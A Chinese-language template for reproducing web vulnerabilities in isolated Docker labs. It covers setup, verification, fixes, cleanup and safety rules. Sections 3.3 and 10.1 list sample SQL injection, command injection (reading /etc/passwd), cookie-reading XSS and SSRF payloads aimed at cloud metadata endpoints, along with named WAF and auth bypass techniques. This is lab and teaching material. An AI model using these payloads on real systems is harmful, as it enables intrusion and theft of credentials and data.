# 漏洞复现步骤模板

基于SKILL.md漏洞环境模拟与搭建指南的复现步骤模板

## 1. 环境信息

### 1.1 基本信息
- **漏洞类型**：[SQL注入/命令注入/XSS/认证绕过/路径遍历/SSRF/CSRF/XXE/反序列化/SSTI/RCE/IDOR/文件上传]
- **影响版本**：[版本范围]
- **环境要求**：[所需组件]
- **复现难度**：[低/中/高]

### 1.2 技术栈
- **主要语言**：[Java/Python/Go/PHP/Node.js]
- **框架**：[Spring Boot/Flask/Gin/Laravel/Express]
- **数据库**：[MySQL/PostgreSQL/MongoDB/Redis]
- **中间件**：[Nginx/Apache/Tomcat]

## 2. 环境搭建

### 2.1 Docker 配置

#### 2.1.1 基础 Dockerfile 模板
```dockerfile
# 漏洞复现环境
FROM [base_image]

# 设置工作目录
WORKDIR /app

# 安装依赖
RUN [install_commands]

# 复制应用代码
COPY . /app

# 安装应用依赖
RUN [install_app_dependencies]

# 暴露端口
EXPOSE [port]

# 设置环境变量
ENV [environment_variables]

# 启动应用
CMD ["[start_command]"]
```

#### 2.1.2 docker-compose 模板
```yaml
version: '3'
services:
  app:
    build: .
    ports:
      - "[host_port]:[container_port]"
    environment:
      - "[environment_variable_1]=[value_1]"
      - "[environment_variable_2]=[value_2]"
    depends_on:
      - [dependency_service]
  
  [dependency_service]:
    image: [dependency_image]
    environment:
      - "[environment_variable]=[value]"
```

### 2.2.2 手动搭建（可选）
```bash
# 安装依赖
[install_commands]

# 配置应用
[configuration_commands]

# 启动服务
[start_commands]
```

## 3. 漏洞验证

### 3.1 触发条件
- **触发点**：[URL/API/输入点]
- **请求方法**：[GET/POST/PUT/DELETE]
- **参数**：[参数名]

### 3.2 验证步骤

#### 3.2.1 第一步：基础测试
```bash
# 基础请求测试
curl -X [METHOD] '[URL]' \
  -H 'Content-Type: application/json' \
  -d '[payload]'
```
**预期结果**：[描述预期的漏洞触发结果]

#### 3.2.2 第二步：深入测试
```bash
# 深入请求测试
curl -X [METHOD] '[URL]' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: [cookie_value]' \
  -d '[advanced_payload]'
```
**预期结果**：[描述预期的漏洞触发结果]

#### 3.2.3 第三步：绕过测试
```bash
# 绕过测试
curl -X [METHOD] '[URL]' \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: [custom_user_agent]' \
  -d '[bypass_payload]'
```
**预期结果**：[描述预期的漏洞触发结果]

### 3.3 Payload 构造

#### 3.3.1 SQL注入 Payload
```bash
# 联合查询注入
curl -X GET "http://example.com/api/users/1' OR '1'='1"

# 盲注
curl -X GET "http://example.com/api/users/1 AND SLEEP(5)"

# 时间盲注
curl -X GET "http://example.com/api/users/1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)"

# 布尔盲注
curl -X GET "http://example.com/api/users/1 AND IF(1=1,SLEEP(5),0)"
```

#### 3.3.2 命令注入 Payload
```bash
# 命令分隔符
curl -X POST "http://example.com/api/execute" -d "command=example.com; cat /etc/passwd"

# 管道注入
curl -X POST "http://example.com/api/execute" -d "command=example.com | whoami"

# 反引号注入
curl -X POST "http://example.com/api/execute" -d "command=example.com`whoami`"
```

#### 3.3.3 XSS Payload
```html
<!-- 反射型XSS攻击 -->
<script>
// 存储型XSS攻击
fetch('http://example.com/api/comments', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        content: '<script>alert(document.cookie)</script>'
    })
});
</script>

<!-- DOM型XSS攻击 -->
<img src=x onerror="alert(document.cookie)">
```

#### 3.3.4 SSRF Payload
```bash
# 内网扫描
curl -X GET "http://example.com/api/proxy?url=http://192.168.1.1:22"

# 云元数据访问
curl -X GET "http://example.com/api/proxy?url=http://169.254.169.254/latest/meta-data/"

# DNS回显测试
curl -X GET "http://example.com/api/proxy?url=http://[random].your-dns-log-domain.com"
```

### 3.4 影响分析

#### 3.4.1 直接影响
- [影响描述1]

#### 3.4.2 间接影响
- [影响描述2]

#### 3.4.3 综合影响
- [综合影响描述]

#### 3.4.4 风险等级
- **CVSS评分**：[评分]
- **风险等级**：[Critical/High/Medium/Low]
- **修复时间要求**：[24小时内/72小时内/2周内/下一版本修复]

## 4. 修复方案

### 4.1 临时缓解措施
- [缓解措施1]
- [缓解措施2]
- [缓解措施3]

### 4.2 永久修复方案

#### 4.2.1 修复代码
```[编程语言]
// 修复前代码
[original_code]

// 修复后代码
[fixed_code]
```

#### 4.2.2 修复说明
- **修复方法**：[参数化查询/输入验证/输出编码/权限检查]
- **修复效果**：[描述修复后的效果]
- **测试方法**：[描述如何验证修复]

### 4.3 修复验证

#### 4.3.1 应用修复
```bash
# 应用修复的命令
[apply_fix_commands]
```

#### 4.3.2 验证修复
```bash
# 验证修复的命令
[verify_fix_commands]
```

#### 4.3.3 结果确认
**预期结果**：[描述修复后的预期结果]
**实际结果**：[记录实际观察到的结果]

## 5. 环境清理

### 5.1 停止服务
```bash
# 停止并移除容器
docker-compose down

# 清理相关文件
rm -rf [temporary_files]
```

### 5.2 清理资源
```bash
# 清理Docker资源
docker system prune -f

# 清理Docker镜像
docker rmi [image_name]
```

## 6. 安全注意事项

### 6.1 操作安全
- **禁止在生产环境测试**：复现测试应在隔离环境中进行
- **限制网络访问**：复现环境应限制网络访问范围
- **使用测试数据**：避免使用真实用户数据或敏感信息
- **及时清理**：测试完成后及时清理复现环境

### 6.2 Payload 安全
- **避免破坏性操作**：不使用删除文件、修改数据等破坏性命令
- **限制网络影响**：避免使用可能影响网络的命令（如大规模ping）
- **使用受控域名**：DNS回显测试应使用自己控制的域名
- **遵守法律法规**：确保测试行为符合法律法规要求

### 6.3 环境管理
- **版本控制**：使用版本控制系统管理复现环境配置
- **权限控制**：限制复现环境的访问权限
- **日志记录**：记录所有测试操作和结果
- **定期更新**：及时更新复现环境，反映最新漏洞情况

## 7. 工具推荐

### 7.1 环境管理工具
- **Docker**：容器化环境管理
- **Vagrant**：虚拟机环境管理
- **Terraform**：云环境基础设施管理
- **Ansible**：自动化配置管理

### 7.2 漏洞验证工具
- **Burp Suite**：Web应用漏洞测试
- **OWASP ZAP**：Web应用渗透测试
- **SQLmap**：SQL注入测试
- **Metasploit**：漏洞利用框架
- **Ysoserial**：Java反序列化测试

### 7.3 网络工具
- **Netcat**：网络连接测试
- **Nmap**：网络扫描
- **Wireshark**：网络流量分析
- **DNSLog**：DNS回显测试
- **RequestBin**：HTTP请求捕获

## 8. 复现记录

### 8.1 测试日志
```
[日期时间] - [测试步骤]
[测试结果]
```

### 8.2 问题记录
```
[问题1]
[问题2]
[问题3]
```

### 8.3 改进建议
```
[改进建议1]
[改进建议2]
[改进建议3]
```

## 9. 复现检查清单

### 9.1 环境搭建检查
- [ ] Docker配置正确
- [ ] 依赖安装完整
- [ ] 网络配置正确
- [ ] 环境变量设置正确

### 9.2 漏洞验证检查
- [ ] 触发条件满足
- [ ] Payload构造正确
- [ ] 测试步骤完整
- [ ] 预期结果符合

### 9.3 修复验证检查
- [ ] 修复方案可行
- [ ] 修复代码正确
- [ ] 修复效果验证
- [ ] 无副作用影响

### 9.4 环境清理检查
- [ ] 服务停止完整
- [ ] 资源清理完整
- [ ] 无残留文件
- [ ] 网络连接断开

## 10. 附录

### 10.1 常用Payload参考
- **SQL注入**：`' OR '1'='1`, `' AND 1=1`, `' UNION SELECT`
- **命令注入**：`; cat /etc/passwd`, `| whoami`, `` `whoami``
- **XSS**：`<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- **SSRF**：`http://127.0.0.1`, `http://169.254.169.254`

### 10.2 常用绕过技术
- **SQL注入绕过**：注释绕过、大小写绕过、编码绕过
- **认证绕过**：空字符绕过、双写绕过、特殊字符绕过
- **文件上传绕过**：双扩展名绕过、NULL字节绕过、MIME类型绕过

### 10.3 防御绕过检测
- **WAF绕过**：编码绕过、分块传输绕过
- **输入验证绕过**：Unicode绕过、长度限制绕过
- **权限检查绕过**：路径遍历绕过、竞态条件绕过